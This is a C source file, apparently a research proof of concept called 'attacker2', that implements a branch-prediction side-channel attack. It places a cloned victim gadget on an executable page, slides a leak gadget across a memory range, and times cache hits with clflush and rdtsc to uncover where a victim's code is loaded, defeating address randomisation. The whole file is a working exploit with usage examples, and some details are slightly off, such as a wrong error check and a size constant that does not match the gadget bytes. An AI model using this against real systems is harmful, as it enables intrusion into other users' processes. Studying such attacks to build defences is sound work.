#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <sys/mman.h>
#include <sys/mman.h>
#include <signal.h>
#include <linux/mman.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <time.h>
#include <xmmintrin.h>

#define THRESHOLD 0xa0

void doNothing();

uint8_t *rdiPtr = (uint8_t *)doNothing;
uint8_t unused[4096];
uint8_t probeArray[4096];

/*modify gadget to mimic victim last branches*/
#define GADGET_CLONE "\x90\x90\x90\x90\x90\x0f\x31\xff\x27\xb8\x1e\x00\x00\x00\x83\xe8\x01\x75\xfb\xeb\xeb"
#define GADGET_CLONE_SIZE 23
#define RD_R13_GADGET "E\x8am\x00"


void doNothing(){
    asm volatile (
            "mov esi,eax            \n"
            "mov ebx,edx            \n"
    		"rdtsc                  \n"
            "shl rbx, 32             \n"
            "add rbx,rsi            \n"
            "shl rdx,32             \n"
            "add rdx,rax             \n"
            "sub rdx, rbx           \n"
            "mov rax, rdx           \n"
            );
}

uint32_t callGadget(uint64_t code){

    volatile uint32_t time;
    asm __volatile__(
                "lea rdi, %2    \n"
                "lea r13, %3    \n"
                "call %1       \n"
                :"=a" (time)
                : "m"(code),"m"(rdiPtr),"m"(probeArray[0])
                : "rdi"
            );
    return time;
}

void flush(char *adrs) 
{
    asm volatile (
		"clflush [%0]			\n"
      :
      : "c" (adrs)
      : "rax");
}

unsigned probe(char *adrs) 
{
	volatile unsigned long time;
    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    mov esi, eax       \n"
        "    mov eax,[%1]       \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    sub eax, esi       \n"
        "    clflush [%1]       \n"
		"    mfence             \n"
        "    lfence             \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}


float disclosure(uint64_t rwx){
    
    int hits=0;
    int total;
    for(total=0; total<0x8;total++){
        
        flush(&rdiPtr);
        callGadget(rwx);
        
        if(probe(&probeArray[0])< THRESHOLD){
            hits++;
        }
    }
    float avg = (float)hits/(float)total;
    
    return avg;
    
}


void leakAddress(uint64_t gadgetBase,uint64_t entrypoint,uint64_t start,uint64_t end,uint64_t offset){

    float rate;
    uint8_t * page;
    uint64_t currentAddr;
    volatile uint8_t d;
    
    /*Seting up rwz caller page*/
    uint8_t * rwx = mmap((1UL<<32)+gadgetBase&(~0xfffUL), 0x1000UL, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE| MAP_ANONYMOUS | MREMAP_FIXED,-1, 0);
    if(rwx==-1){
        perror("mmap rwx");
        exit(1);
    }
    memcpy(&rwx[gadgetBase&0xfffUL],GADGET_CLONE,GADGET_CLONE_SIZE);

    /*seting up destination leak gadget*/
    page = mmap(NULL, 0x1000UL, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE| MAP_ANONYMOUS,-1, 0);
    if(rwx==-1){
        perror("destination leak gadget");
        exit(1);
    }
    memcpy(&page[offset], RD_R13_GADGET, sizeof(RD_R13_GADGET));
    
    

    for(currentAddr=start;currentAddr<(end+1);currentAddr = currentAddr+(1UL<<20UL) )
    {
        page = mremap(page, 0x1000UL,
                    0x1000UL, MREMAP_MAYMOVE | MREMAP_FIXED , currentAddr);
        if(page==-1){
            perror("mmap remap");
            exit(1);
        }
        d = page[offset];
        rate = disclosure(rwx+entrypoint);
        if(rate>0.4){
            printf("\nPage Index: (%p) - rate : %f\n",currentAddr,rate);
            break;
        }
        
    }
   
}

int main(int argc,char **argv){
    
    
    struct timeval begint, endt;

    if (argc < 6){
        printf("Usage: ./attacker2 gadgetBase, entrypoint start end offset\n");
        printf("Example: ./attacker2 0x31154 0x15d 0x555000031000 0x56f000031000 0x135\n");
        return 0;
    }

    uint64_t gadgetBase=(uint64_t)strtoul(argv[1],NULL,16)&0xfffff;
    uint64_t entrypoint=(uint64_t)strtoul(argv[2],NULL,16)&0xfff;

    uint64_t start=(uint64_t)strtoul(argv[3],NULL,16)&(~0xfffUL);
    uint64_t end=(uint64_t)strtoul(argv[4],NULL,16)&(~0xfffUL);
    uint64_t offset=(uint64_t)strtoul(argv[5],NULL,16)&(0xfffUL);

    printf("Attacker: src: %p ->dst: %p \n",entrypoint,offset);


    gettimeofday(&begint, 0);
    leakAddress(gadgetBase,entrypoint,start,end,offset);
    gettimeofday(&endt, 0);
    long seconds = endt.tv_sec - begint.tv_sec;
    long microseconds = endt.tv_usec - begint.tv_usec;
    double elapsed = seconds + microseconds*1e-6;
    
    
    printf("Finished at: %.3f seconds.\n", elapsed);


}
